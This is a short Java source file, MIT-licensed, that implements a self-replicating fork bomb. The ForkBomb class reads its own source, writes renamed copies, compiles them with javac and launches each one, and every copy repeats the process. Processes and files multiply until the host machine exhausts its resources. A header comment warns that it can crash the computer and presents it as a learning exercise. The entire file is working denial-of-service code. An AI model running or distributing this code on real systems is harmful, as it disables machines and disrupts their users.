/*
The MIT License (MIT)

Copyright (c) 2015, 2016 Varun Maudgalya

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

/* Warning: This can crash your computer if you do not know what you are doing.
*           Please use this at your own discretion for learning purposes.
*/
import java.io.*;
public class ForkBomb {
  public static void main(String[] args) {
    for (int i = 0; i < 100; i++) {
      bomb(i);
    }
  }
  public static void bomb(int attachment) {
    ForkBomb fb = new ForkBomb();
    String name = fb.getClass().getName() + attachment;
    try {
      BufferedReader in = new BufferedReader(new FileReader("ForkBomb.java"));
      PrintWriter out = new PrintWriter(new BufferedWriter(new FileWriter(name + ".java")));
      StringBuilder program = new StringBuilder();
      String line = null;
      while ((line = in.readLine()) != null) {
        program.append(line);
      }
      out.println(program.toString().replace("ForkBomb", name));
      out.flush();
      out.close();
      Process compile = Runtime.getRuntime().exec("javac " + name + ".java");
      compile.waitFor();
      Process run = Runtime.getRuntime().exec("java " + name);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
